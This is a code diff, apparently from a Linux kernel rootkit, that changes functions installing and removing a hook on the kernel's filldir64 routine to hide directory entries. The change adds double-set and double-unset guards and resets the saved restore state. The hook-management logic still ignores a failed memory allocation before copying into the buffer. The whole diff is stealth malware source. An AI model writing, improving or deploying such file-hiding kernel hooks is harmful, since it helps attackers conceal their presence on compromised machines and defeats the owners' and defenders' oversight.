@@ -89,22 +89,31 @@ efault:
 static struct view hook_filldir64_restore = {0};
 
 void hide_set_filldir64(void) {
-	u8 *restore;
-
+	// only set if not previously set
+	if (hook_filldir64_restore.ptr != NULL)
+		return;
+	
 	hook_set((void *)filldir64, &filldir64_hook);
 
-	restore = kmalloc(hook_last_replaced_sz, GFP_KERNEL);
-	if (!restore) {
+	hook_filldir64_restore.ptr = kmalloc(hook_last_replaced_sz, GFP_KERNEL);
+	if (!hook_filldir64_restore.ptr) {
 		/* well */
 	}
 
-	memcpy(restore, hook_last_replaced, hook_last_replaced_sz);
+	memcpy(hook_filldir64_restore.ptr, hook_last_replaced, hook_last_replaced_sz);
 
-	hook_filldir64_restore.ptr = restore;
 	hook_filldir64_restore.size = hook_last_replaced_sz;
 }
 
 void hide_unset_filldir64(void) {
+	// only unset if previously set
+	if (hook_filldir64_restore.ptr == NULL)
+		return;
+	
 	hook_unset((void *)filldir64, hook_filldir64_restore.ptr, hook_filldir64_restore.size);
 	kfree(hook_filldir64_restore.ptr);
+	
+	// reset view so on next hook_set kmalloc will be called
+	hook_filldir64_restore.ptr = 0;
+	hook_filldir64_restore.size = 0;
 }
